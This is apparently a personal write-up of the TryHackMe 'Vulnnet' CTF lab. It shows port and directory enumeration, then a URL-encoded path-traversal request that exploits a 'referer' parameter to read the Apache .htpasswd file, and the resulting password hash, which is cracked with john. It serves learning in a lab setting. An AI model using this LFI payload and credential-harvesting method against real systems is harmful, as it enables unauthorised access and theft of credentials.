# Hack Log 9 - TryHackMe [Vulnnet](https://tryhackme.com/room/vulnnet)

📆:**Date:** 2025-06-23
🔍**Objective:** Obtain flags.  
🎯**Target**: TryHackme Vulnnet (Lab CTF)  

---  

## 🛠️ Actions Taken  

### Port and Service Enumeration  

```bash
nmap -A -p- 10.10.45.143
```

| Port    | Service  | Description                    |
|---------|----------|--------------------------------|
| 22 | ssh    | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)|                 |
| 80 | http     | Apache httpd 2.4.29                  |  


### Directory Enumeration  

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.46.143/
```

→ Found following directories  
  - /css
  - /img
  - /js

→ In "/js" there were 2 javascript files, upon observing both  
  - index__7ed54732.js
    ```javascript
    function l(a) {
           
            return fetch(function(a) {
            
                return "".concat(void 0 === e ? "http://broadcast.vulnnet.thm" : e).concat("/", "?_alias=").concat(n, "&_callbackAlias=").concat(l, "&_lang=").concat(c)
            }
    ```
    - The code snippet mentioned another subdomain as "http://broadcast.vulnnet.thm".  
   

    - index__d8338055.js
      ```javascript
          return n.d(t, "a", t), t
            }, n.o = function(e, t) {
          return Object.prototype.hasOwnProperty.call(e, t)
        }, n.p = "http://vulnnet.thm/index.php?referer=", n(n.s = 0) }({
      ```
    - Found "referer" parameter which can lead to LFI.
   


### Local File Inclusion  

→ Testing LFI  
  - Fuzzing the endpoint "http://vulnnet.thm/index.php?referer=" with LFI payloads using Burp with the payload
    ```
    GET /index.php?referer=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2F%2e%2e%2F%2e%2e%2Fetc%2fapache2%2f.htpasswd HTTP/1.1
    Host: vulnnet.thm
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    ```
  - Received the contents of "/etc/passwd in response which confirmed LFI.


### Exploitation  

→ Since apache was running in the machine, looking for "/etc/apache2/.htpasswd" returned a username and password hash.
  ```
      developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
  ```
→ Successfully cracked the hash with john.
    


